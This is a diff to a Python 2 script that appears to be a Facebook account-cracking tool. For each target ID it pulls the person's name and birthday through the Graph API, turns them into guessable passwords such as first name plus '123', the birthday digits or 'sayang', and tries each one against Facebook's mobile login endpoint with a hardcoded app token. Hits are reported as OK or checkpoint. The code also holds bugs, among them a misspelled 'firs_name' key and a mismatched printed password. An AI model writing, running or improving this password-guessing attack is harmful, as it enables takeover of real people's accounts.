@@ -625,17 +625,11 @@ def pilih_super():
     print 52 * '\x1b[1;97m\xe2\x95\x90'
 
     def main(arg):
-        arp = open('password.bin','r').readlines()
         user = arg
         try:
-            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
-            b = json.loads(a.text)
-            arp.append(b['first_name'])
-            arp.append(b['last_name'])
-            arp.append(b['first_name'].lower())
-            arp.append(b['last_name'].lower())
-            for arp1 in arp:
-                pass1 = arp1.strip() + '123'
+                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+                b = json.loads(a.text)
+                pass1 = b['first_name'] + '123'
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
@@ -644,8 +638,7 @@ def pilih_super():
                     if 'www.facebook.com' in q['error_msg']:
                         print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                     else:
-                        for arp2 in arp:
-                            pass2 = arp2.strip() + '1234'
+                            pass2 = b['firs_name'] + '12345'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
@@ -654,8 +647,7 @@ def pilih_super():
                                 if 'www.facebook.com' in q['error_msg']:
                                     print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                                 else:
-                                    for arp3 in arp:
-                                        pass3 = arp3.strip() + '12345'
+                                        pass3 = b['last_name'] + '123'
                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                         q = json.load(data)
                                         if 'access_token' in q:
@@ -664,8 +656,8 @@ def pilih_super():
                                             if 'www.facebook.com' in q['error_msg']:
                                                 print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                             else:
-                                                for arp4 in arp:
-                                                    pass4 = arp4.strip()
+                                                    lahir = b['birthday']
+                                                    pass4 = lahir.replace('/', '')
                                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                     q = json.load(data)
                                                     if 'access_token' in q:
@@ -674,16 +666,14 @@ def pilih_super():
                                                         if 'www.facebook.com' in q['error_msg']:
                                                             print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
                                                         else:
-                                                            lahir = b['birthday']
-                                                            pass5 = lahir.replace('/', '')
+                                                            pass5 = ('sayang')                                          
                                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                             q = json.load(data)
                                                             if 'access_token' in q:
                                                                 print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
                                                             else:
                                                                 if 'www.facebook.com' in q['error_msg']:
-                                                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
-                                                    
+                                                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5
         except:
             pass
 
